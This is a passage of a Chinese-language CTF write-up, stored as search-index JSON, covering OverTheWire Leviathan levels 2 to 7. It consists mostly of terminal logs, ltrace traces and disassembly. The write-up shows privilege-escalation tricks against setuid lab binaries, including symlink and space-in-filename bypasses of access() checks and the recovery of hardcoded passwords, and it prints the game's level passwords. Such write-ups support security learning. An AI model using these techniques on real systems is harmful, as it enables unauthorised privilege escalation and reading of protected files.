-0xc(%ebp),%edx 80492b3: 65 2b 15 14 00 00 00 sub %gs:0x14,%edx 80492ba: 74 05 je 80492c1 <main+0xdb> 80492bc: e8 bf fd ff ff call 8049080 <__stack_chk_fail@plt> 80492c1: 8d 65 f8 lea -0x8(%ebp),%esp 80492c4: 59 pop %ecx 80492c5: 5b pop %ebx 80492c6: 5d pop %ebp 80492c7: 8d 61 fc lea -0x4(%ecx),%esp 80492ca: c3 ret Disassembly of section .fini: 080492cc <_fini>: 80492cc: f3 0f 1e fb endbr32 80492d0: 53 push %ebx 80492d1: 83 ec 08 sub $0x8,%esp 80492d4: e8 47 fe ff ff call 8049120 <__x86.get_pc_thunk.bx> 80492d9: 81 c3 27 2d 00 00 add $0x2d27,%ebx 80492df: 83 c4 08 add $0x8,%esp 80492e2: 5b pop %ebx 80492e3: c3 ret leviathan1@gibson:~$ \u5176\u4e2d\u7684 movl $0x786573,-0x20(%ebp) \u770b\u51fa\u6765\u5bc6\u7801\u662fsex \u8bf4\u597d\u7684\u53ea\u9700\u8981\u57fa\u672c\u7684linux\u547d\u4ee4\u5462\uff1f\uff1f\uff1f\u592a\u62bd\u8c61\u4e86 leviathan1@gibson:~$ ./check password: sex $ cat /etc/leviathan_pass/leviathan2 mEh5PNl10e $","title":"level2"},{"location":"en/WarGame/leviathan/#_1","text":"\u5f88\u597d\uff0c\u7136\u540e\u53bb\u7f51\u4e0a\u770b\u4e86\u4e00\u4e0b\u522b\u4eba\u7684\u7b54\u6848\uff0c\u8c8c\u4f3c\u6709\u53e6\u4e00\u4e2a\u597d\u4e1c\u897f\u53eb ltrace \u8fd9\u4e2a\u73a9\u610f\u513f\u53ef\u4ee5\u5355\u6b65\u8c03\u8bd5\uff0c\u7136\u540e\u5c31\u5f88\u7b80\u5355\u4e86 leviathan1@gibson:~$ ltrace ./check __libc_start_main(0x80491e6, 1, 0xffffd504, 0 <unfinished ...> printf(\"password: \") = 10 getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: 123 ) = 49 getchar(0xf7fbe4a0, 0xf7fd6f31, 0x786573, 0x646f67) = 50 getchar(0xf7fbe4a0, 0xf7fd3231, 0x786573, 0x646f67) = 51 strcmp(\"123\", \"sex\") = -1 puts(\"Wrong password, Good Bye ...\"Wrong password, Good Bye ... ) = 29 +++ exited (status 0) +++ leviathan1@gibson:~$ \u8fd9\u91cc\u6709\u4e00\u4e2a\u4e2d\u6587\u7684 \u6559\u7a0b","title":"\u4ed6\u4eba\u89e3\u6cd5"},{"location":"en/WarGame/leviathan/#level3","text":"\u76f4\u63a5\u8fd0\u884c\u4f1a\u63d0\u793a\u4e0d\u6210\u529f leviathan2@gibson:~$ ll total 36 drwxr-xr-x 2 root root 4096 Apr 23 18:04 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r-sr-x--- 1 leviathan3 leviathan2 15060 Apr 23 18:04 printfile* -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan2@gibson:~$ file printfile printfile: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=32c7e041842883e05808ab99c763a0fc1849b84e, for GNU/Linux 3.2.0, not stripped leviathan2@gibson:~$ printfile printfile: command not found leviathan2@gibson:~$ printfile --help printfile: command not found leviathan2@gibson:~$ ./printfile *** File Printer *** Usage: ./printfile filename leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3 You cant have that file... \u7136\u540e\u5206\u522b\u770b\u4e00\u4e0b leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan2 /bin/cat: /etc/leviathan_pass/leviathan2: Permission denied leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3 __libc_start_main(0x80491e6, 2, 0xffffd4d4, 0 <unfinished ...> access(\"/etc/leviathan_pass/leviathan3\", 4) = -1 puts(\"You cant have that file...\"You cant have that file... ) = 27 +++ exited (status 1) +++ leviathan2@gibson:~$ ltrace ./printfile .bashrc __libc_start_main(0x80491e6, 2, 0xffffd4e4, 0 <unfinished ...> access(\".bashrc\", 4) = 0 snprintf(\"/bin/cat .bashrc\", 511, \"/bin/cat %s\", \".bashrc\") = 16 geteuid() = 12002 geteuid() = 12002 setreuid(12002, 12002) = 0 system(\"/bin/cat .bashrc\"# ~/.bashrc: executed by bash(1) for non-login shells. \u8fd9\u91cc\u7684\u903b\u8f91\u662f\uff0caccess\u51fd\u6570\u6765\u5224\u65ad\u4f60\u662f\u5426\u6709\u67d0\u4e2a\u6587\u4ef6\u7684\u6743\u9650\uff0c\u7136\u540e\u8c03\u7528cat\u8fdb\u884c\u8f93\u51fa\u3002\u56e0\u6b64\u53ef\u884c\u7684\u89e3\u91ca\u5c31\u662f\u4f7f\u7528\u6709\u7a7a\u683c\u7684\u6587\u4ef6\u540d\uff0c\u505a\u4e00\u4e2a\u8f6f\u8fde\u63a5\uff0c\u8fd9\u6837cat\u53ea\u4f1a\u8bfb\u53d6\u7b2c\u4e00\u4e2a\uff0c\u5c31\u7ed3\u675f\u4e86\u3002 leviathan2@gibson:~$ cd /tmp/ leviathan2@gibson:/tmp$ ls ls: cannot open directory '.': Permission denied leviathan2@gibson:/tmp$ mkdir hnz leviathan2@gibson:/tmp$ cd hnz leviathan2@gibson:/tmp/hnz$ ls leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 06:59 ./ drwxrwx-wt 16075 root root 741376 Jul 19 06:59 ../ leviathan2@gibson:/tmp/hnz$ touch \"file1 file2.txt\" leviathan2@gibson:/tmp/hnz$ ls file1 file2.txt leviathan2@gibson:/tmp/hnz$ ln -s /etc/leviathan_pass/leviathan3 /tmp/hnz/file1 leviathan2@gibson:/tmp/hnz$ ll total 732 drwxrwxr-x 2 leviathan2 leviathan2 4096 Jul 19 07:02 ./ drwxrwx-wt 16075 root root 741376 Jul 19 07:02 ../ lrwxrwxrwx 1 leviathan2 leviathan2 30 Jul 19 07:02 file1 -> /etc/leviathan_pass/leviathan3 -rw-rw-r-- 1 leviathan2 leviathan2 0 Jul 19 07:00 file1 file2.txt leviathan2@gibson:~$ ./printfile /tmp/hnz/\"file1 file2.txt\" Q0G8j4sakn /bin/cat: file2.txt: No such file or directory leviathan2@gibson:~$","title":"level3"},{"location":"en/WarGame/leviathan/#level4","text":"\u8fd8\u662f\u5148\u770b\u4e00\u4e0b leviathan3@gibson:~$ ./level3 Enter the password> 123 bzzzzzzzzap. WRONG leviathan3@gibson:~$ ltrace ./level3 __libc_start_main(0x80492bf, 1, 0xffffd504, 0 <unfinished ...> strcmp(\"h0no33\", \"kakaka\") = -1 printf(\"Enter the password> \") = 20 fgets(Enter the password> 1234 \"1234\\n\", 256, 0xf7e2a620) = 0xffffd2dc strcmp(\"1234\\n\", \"snlprintf\\n\") = -1 puts(\"bzzzzzzzzap. WRONG\"bzzzzzzzzap. WRONG ) = 19 +++ exited (status 0) +++ \u7136\u540e\u5c31\u662f\u76f4\u63a5\u8bfb\u53d6\u4e86\uff0c\u8fd9\u73a9\u610f\u513f\u5c31\u662f\u4e00\u63d0\u6743 leviathan3@gibson:~$ ./level3 Enter the password> snlprintf [You've got shell]! $ cat /etc/leviathan_pass/leviathan4 AgvropI4OA $","title":"level4"},{"location":"en/WarGame/leviathan/#level5","text":"\u753b\u98ce\u8d8a\u6765\u8d8a\u6b63\u5e38\u4e86 leviathan4@gibson:~/.trash$ ./bin 01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010 \u663e\u7136\u7684ascii\u7f16\u7801 echo \"01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010\" | perl -lape '$_=pack\"(B8)*\",@F' EKKlTF1Xqs","title":"level5"},{"location":"en/WarGame/leviathan/#level6","text":"\u8c8c\u4f3c\u76f4\u63a5\u8f93\u51fa\u4e86level5\u7684\u5bc6\u7801 leviathan5@gibson:~$ ./leviathan5 EKKlTF1Xqs \u770b\u8d77\u6765\u6709\u4e2a\u53eblog\u7684\u5f88\u6709\u7528 leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0 puts(\"Cannot find /tmp/file.log\"Cannot find /tmp/file.log ) = 26 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan5@gibson:~$ ltrace ./leviathan5 __libc_start_main(0x8049206, 1, 0xffffd534, 0 <unfinished ...> fopen(\"/tmp/file.log\", \"r\") = 0x804d1a0 fgetc(0x804d1a0) = 'E' feof(0x804d1a0) = 0 putchar(69, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 69 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'K' feof(0x804d1a0) = 0 putchar(75, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 75 fgetc(0x804d1a0) = 'l' feof(0x804d1a0) = 0 putchar(108, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 108 fgetc(0x804d1a0) = 'T' feof(0x804d1a0) = 0 putchar(84, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 84 fgetc(0x804d1a0) = 'F' feof(0x804d1a0) = 0 putchar(70, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 70 fgetc(0x804d1a0) = '1' feof(0x804d1a0) = 0 putchar(49, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 49 fgetc(0x804d1a0) = 'X' feof(0x804d1a0) = 0 putchar(88, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 88 fgetc(0x804d1a0) = 'q' feof(0x804d1a0) = 0 putchar(113, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 113 fgetc(0x804d1a0) = 's' feof(0x804d1a0) = 0 putchar(115, 0x804a008, 0xf7c184be, 0xf7fbe4a0) = 115 fgetc(0x804d1a0) = '\\n' feof(0x804d1a0) = 0 putchar(10, 0x804a008, 0xf7c184be, 0xf7fbe4a0EKKlTF1Xqs ) = 10 fgetc(0x804d1a0) = '\\377' feof(0x804d1a0) = 1 fclose(0x804d1a0) = 0 getuid() = 12005 setuid(12005) = 0 unlink(\"/tmp/file.log\") = 0 +++ exited (status 0) +++ leviathan5@gibson:~$ \u90a3\u8fd8\u662f\u8f6f\u8fde\u63a5\u5c31\u89e3\u51b3\u4e86 leviathan5@gibson:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log leviathan5@gibson:~$ ./leviathan5 YZ55XPVk2l leviathan5@gibson:~$","title":"level6"},{"location":"en/WarGame/leviathan/#level7","text":"leviathan6@gibson:~$ ./leviathan6 usage: ./leviathan6 <4 digit code> leviathan6@gibson:~$ ltrace ./leviathan6 __libc_start_main(0x80491d6, 1, 0xffffd504, 0 <unfinished ...> printf(\"usage: %s <4 digit code>\\n\", \"./leviathan6\"usage: ./leviathan6 <4 digit code> ) = 35 exit(-1 <no return ...> +++ exited (status 255) +++ leviathan6@gibson:~$ ltrace ./leviathan6 1234 __libc_start_main(0x80491d6, 2, 0xffffd4e4, 0 <unfinished ...> atoi(0xffffd668, 0xf7fd6f80, 0xf7c184be, 0xf7fbe4a0) = 1234 puts(\"Wrong\"Wrong ) = 6 +++ exited (status 0) +++ \u5f88\u597d\uff0c\u53c8\u8981\u770b\u6c47\u7f16\u4e86 leviathan6@gibson:~$ objdump -d leviathan6 leviathan6: file format elf32-i386 Disassembly of section .init: 08049000 <_init>: 8049000: f3 0f 1e fb endbr32 8049004: 53 push %ebx 8049005: 83 ec 08 sub $0x8,%esp 8049008: e8 03 01 00 00 call 8049110 <__x86.get_pc_thunk.bx> 804900d: 81 c3 f3 2f 00 00 add $0x2ff3,%ebx 8049013: 8b 83 fc ff ff ff mov -0x4(%ebx),%eax 8049019: 85 c0 test %eax,%eax 804901b: 74 02 je 804901f <_init+0x1f> 804901d: ff d0 call *%eax 804901f: 83 c4 08 add $0x8,%esp 8049022: 5b pop %ebx 8049023: c3 ret Disassembly of section .plt: 08049030 <__libc_start_main@plt-0x10>: 8049030: ff 35 04 c0 04 08 push 0x804c004 8049036: ff 25 08 c0 04 08 jmp *0x804c008 804903c: 00 00 add %al,(%eax) ... 08049040 <__libc_start_main@plt>: 8049040: ff 25 0c c0 04 08 jmp *0x804c00c 8049046: 68 00 00 00 00 push $0x0 804904b: e9 e0 ff ff ff jmp 8049030 <_init+0x30> 08049050 <printf@plt>: 8049050: ff 25 10 c0 04 08 jmp *0x804c010 8049056: 68 08 00 00 00 push $0x8 804905b: e9 d0 ff ff ff jmp 8049030 <_init+0x30> 08049060 <geteuid@plt>: 8049060: ff 25 14 c0 04 08 jmp *0x804c014 8049066: 68 10 00 00 00 push $0x10 804906b: e9 c0 ff ff ff jmp 8049030 <_init+0x30> 08049070 <puts@plt>: 8049070: ff 25 18 c0 04 08 jmp *0x804c018 8049076: 68 18 00 00 00 push $0x18 804907b: e9 b0 ff ff ff jmp 8049030 <_init+0x30> 08049080 <system@plt>: 8049080: ff 25 1c c0 04 08 jmp *0x804c01c 8049086: 68 20 00 00 00 push $0x20 804908b: e9 a0 ff ff ff jmp 8049030 <_init+0x30> 08049090 <exit@plt>: 8049090: ff 25 20 c0 04 08 jmp *0x804c020 8049096: 68 28 00 00 00 push $0x28 804909b: e9 90 ff ff ff jmp 8049030 <_init+0x30> 080490a0 <setreuid@plt>: 80490a0: ff 25 24 c0 04 08 jmp *0x804c024 80490a6: 68 30 00 00 00 push $0x30 80490ab: e9 80 ff ff ff jmp 8049030 <_init+0x30> 080490b0 <atoi@plt>: 80490b0: ff 25 28 c0 04 08 jmp *0x804c028 80490b6: 68 38 00 00 00 push $0x38 80490bb: e9 70 ff ff ff jmp 8049030 <_init+0x30> Disassembly of section .text: 080490c0 <_start>: 80490c0: f3 0f 1e fb endbr32 80490c4: 31 ed xor %ebp,%ebp 80490c6: 5e pop %esi 80490c7: 89 e1 mov %esp,%ecx 80490c9: 83 e4 f0 and $0xfffffff0,%esp 80490cc: 50 push %eax 80490cd: 54 push %esp 80490ce: 52 push %edx 80490cf: e8 19 00 00 00 call 80490ed <_start+0x2d> 80490d4: 81 c3 2c 2f 00 00 add $0x2f2c,%ebx 80490da: 6a 00 push $0x0 80490dc: 6a 00 push $0x0 80490de: 51 push %ecx 80490df: 56 push %esi 80490e0: c7 c0 d6 91 04 08 mov $0x80491d6,%eax 80490e6: 50 push %eax 80490e7: e8 54 ff ff ff call 8049040 <__libc_start_main@plt> 80490ec: f4 hlt 80490ed: 8b 1c 24 mov (%esp),%ebx 80490f0: c3 ret 80490f1: 66 90 xchg %ax,%ax 80490f3: 66 90 xchg %ax,%ax 80490f5: 66 90 xchg %ax,%ax 80490f7: 66 90 xchg %ax,%ax 80490f9: 66 90 xchg %ax,%ax 80490fb: 66 90 xchg %ax,%ax 80490fd: 66 90 xchg %ax,%ax 80490ff: 90 nop 08049100 <_dl_relocate_static_pie>: 8049100: f3 0f 1e fb endbr32 8049104: c3 ret 8049105: 66 90 xchg %ax,%ax 8049107: 66 90 xchg %ax,%ax 8049109: 66 90 xchg %ax,%ax 804910b: 66 90 xchg %ax,%ax 804910d: 66 90 xchg %ax,%ax 804910f: 90 nop 08049110 <__x86.get_pc_thunk.bx>: 8049110: 8b 1c 24 mov (%esp),%ebx 8049113: c3 ret 8049114: 66 90 xchg %ax,%ax 8049116: 66 90 xchg %ax,%ax 8049118: 66 90 xchg %ax,%ax 804911a: 66 90 xchg %ax,%ax 804911c: 66 90 xchg %ax,%ax 804911e: 66 90 xchg %ax,%ax 08049120 <deregister_tm_clones>: 8049120: b8 34 c0 04 08 mov $0x804c034,%eax 8049125: 3d 34 c0 04 08 cmp $0x804c034,%eax 804912a: 74 24 je 8049150 <deregister_tm_clones+0x30> 804912c: b8 00 00 00 00 mov $0x0,%eax 8049131: 85 c0 test %eax,%eax 8049133: 74 1b je 8049150 <deregister_tm_clones+0x30> 8049135: 55 push %ebp 8049136: 89 e5 mov %esp,%ebp 8049138: 83 ec 14 sub $0x14,%esp 804913b: 68 34 c0 04 08 push $0x804c034 8049140: ff d0 call *%eax 8049142: 83 c4 10 add $0x10,%esp 8049145: c9 leave 8049146: c3 ret 8049147: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804914e: 66 90 xchg %ax,%ax 8049150: c3 ret 8049151: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 8049158: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 804915f: 90 nop 08049160 <register_tm_clones>: 8049160: b8 34 c0 04 08 mov $0x804c034,%eax 8049165: 2d 34 c0 04 08 sub $0x804c034,%eax 804916a: 89 c2 mov %eax,%edx 804916c: c1 e8 1f shr $0x1f,%eax 804916f: c1 fa 02 sar $0x2,%edx 8049172: 01 d0 add %edx,%eax 8049174: d1 f8 sar %eax 8049176: 74 20 je 8049198 <register_tm_clones+0x38> 8049178: ba 00 00 00 00 mov $0x0,%edx 804917d: 85 d2 test %edx,%edx 804917f: 74 17 je 8049198 <register_tm_clones+0x38> 8049181: 55 push %ebp 8049182: 89 e5 mov %esp,%ebp 8049184: 83 ec 10 sub $0x10,%esp 8049187: 50 push %eax 8049188: 68 34 c0 04 08 push $0x804c034 804918d: ff d2 call *%edx 804918f: 83 c4 10 add $0x10,%esp 8049192: c9 leave 8049193: c3 ret 8049194: 8d 74 26 00 lea 0x0(%esi,%eiz,1),%esi 8049198: c3 ret 8049199: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491a0 <__do_global_dtors_aux>: 80491a0: f3 0f 1e fb endbr32 80491a4: 80 3d 34 c0 04 08 00 cmpb $0x0,0x804c034 80491ab: 75 1b jne 80491c8 <__do_global_dtors_aux+0x28> 80491ad: 55 push %ebp 80491ae: 89 e5 mov %esp,%ebp 80491b0: 83 ec 08 sub $0x8,%esp 80491b3: e8 68 ff ff ff call 8049120 <deregister_tm_clones> 80491b8: c6 05 34 c0 04 08 01 movb $0x1,0x804c034 80491bf: c9 leave 80491c0: c3 ret 80491c1: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 80491c8: c3 ret 80491c9: 8d b4 26 00 00 00 00 lea 0x0(%esi,%eiz,1),%esi 080491d0 <frame_dummy>: 80491d0: f3 0f 1e fb endbr32 80491d4: eb 8a jmp 8049160 <register_tm_clones> 080491d6 <main>: 80491d6: 8d 4c 24 04 lea 0x4(%esp),%ecx 80491da: 83 e4 f0 and $0xfffffff0,%esp 80491dd: ff 71 fc push -0x4(%ecx) 80491e0: 55 push %ebp 80491e1: 89 e5 mov %esp,%ebp 80491e3: 53 push %ebx 80491e4: 51 push %ecx 80491e5: 83 ec 10 sub $0x10,%esp 80491e8: 89 c8 mov %ecx,%eax 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 80491f1: 83 38 02 cmpl $0x2,(%eax) 80491f4: 74 20 je 8049216 <main+0x40> 80491f6: 8b 40 04 mov 0x4(%eax),%eax 80491f9: 8b 00 mov (%eax),%eax 80491fb: 83 ec 08 sub $0x8,%esp 80491fe: 50 push %eax 80491ff: 68 08 a0 04 08 push $0x804a008 8049204: e8 47 fe ff ff call 8049050 <printf@plt> 8049209: 83 c4 10 add $0x10,%esp 804920c: 83 ec 0c sub $0xc,%esp 804920f: 6a ff push $0xffffffff 8049211: e8 7a fe ff ff call 8049090 <exit@plt> 8049216: 8b 40 04 mov 0x4(%eax),%eax 8049219: 83 c0 04 add $0x4,%eax 804921c: 8b 00 mov (%eax),%eax 804921e: 83 ec 0c sub $0xc,%esp 8049221: 50 push %eax 8049222: e8 89 fe ff ff call 80490b0 <atoi@plt> 8049227: 83 c4 10 add $0x10,%esp 804922a: 39 45 f4 cmp %eax,-0xc(%ebp) 804922d: 75 2b jne 804925a <main+0x84> 804922f: e8 2c fe ff ff call 8049060 <geteuid@plt> 8049234: 89 c3 mov %eax,%ebx 8049236: e8 25 fe ff ff call 8049060 <geteuid@plt> 804923b: 83 ec 08 sub $0x8,%esp 804923e: 53 push %ebx 804923f: 50 push %eax 8049240: e8 5b fe ff ff call 80490a0 <setreuid@plt> 8049245: 83 c4 10 add $0x10,%esp 8049248: 83 ec 0c sub $0xc,%esp 804924b: 68 22 a0 04 08 push $0x804a022 8049250: e8 2b fe ff ff call 8049080 <system@plt> 8049255: 83 c4 10 add $0x10,%esp 8049258: eb 10 jmp 804926a <main+0x94> 804925a: 83 ec 0c sub $0xc,%esp 804925d: 68 2a a0 04 08 push $0x804a02a 8049262: e8 09 fe ff ff call 8049070 <puts@plt> 8049267: 83 c4 10 add $0x10,%esp 804926a: b8 00 00 00 00 mov $0x0,%eax 804926f: 8d 65 f8 lea -0x8(%ebp),%esp 8049272: 59 pop %ecx 8049273: 5b pop %ebx 8049274: 5d pop %ebp 8049275: 8d 61 fc lea -0x4(%ecx),%esp 8049278: c3 ret Disassembly of section .fini: 0804927c <_fini>: 804927c: f3 0f 1e fb endbr32 8049280: 53 push %ebx 8049281: 83 ec 08 sub $0x8,%esp 8049284: e8 87 fe ff ff call 8049110 <__x86.get_pc_thunk.bx> 8049289: 81 c3 77 2d 00 00 add $0x2d77,%ebx 804928f: 83 c4 08 add $0x8,%esp 8049292: 5b pop %ebx 8049293: c3 ret \u8fd8\u662fmovl\u8fd9\u4e00\u53e5\u627e\u7acb\u5373\u6570 80491ea: c7 45 f4 d3 1b 00 00 movl $0x1bd3,-0xc(%ebp) 0x1bd3\u6362\u7b97\u4e00\u4e0b\u662f7123 \u7136\u540e\u5f97\u5230\u5bc6\u7801 leviathan6@gibson:~$ ./leviathan6 7123 $ cat /etc/leviathan_pass/leviathan7 8GpZ5f8Hze $ \u8fdb\u5f69\u86cb leviathan7@gibson:~$ ll total 24 drwxr-xr-x 2 root root 4096 Apr 23 18:05 ./ drwxr-xr-x 83 root root 4096 Apr 23 18:06 ../ -rw-r--r-- 1 root root 220 Jan 6 2022 .bash_logout -rw-r--r-- 1 root root 3771 Jan 6 2022 .bashrc -r--r----- 1 leviathan7 leviathan7 178 Apr 23 18:05 CONGRATULATIONS -rw-r--r-- 1 root root 807 Jan 6 2022 .profile leviathan7@gibson:~$ cat CONGRATULATIONS Well Done, you seem to have used a *nix system before, now try something more serious. (Please don't post writeups, solutions or spoilers about the games on the web. Thank you!) leviathan7@gibson:~$ \u8fd9\u73a9\u610f\u513f\uff0c\u91cc\u9762\u6709\u5927\u91cf\u7684\u4e1c\u897f\u53ef\u4e0d\u662flinux\u64cd\u4f5c\u554a\uff0c\u8fd9\u91cc\u9762\u6709\u9605\u8bfb\u6c47\u7f16\u7684\u5185\u5bb9\u7684\u4e8b\u513f\uff0c\u53ef\u5e95\u5c42\u3002\u3002\u3002 \u88ab\u9a97\u7684\u5f88\u60e8\u554a\uff0c\u8fd9\u91cc\u9762\u8981\u4f1a\u7684linux\u662f\u4e0d\u662f\u6307RHCA\u90a3\u79cd\uff0c\u90a3\u53ef\u771f\u5c4c \u548b\u56de\u4e8b\u513f\uff0c\u4eba\u5bb6\u4e0d\u8ba9\u4f20\u7b54\u6848\uff0caz\uff0c\u53cd\u6b63\u6211\u6ca1\u5565\u6d41\u91cf\uff0c\u5c31\u4f20\u4e86\u5427\u3002\u3002\u3002","title":"level7"}]}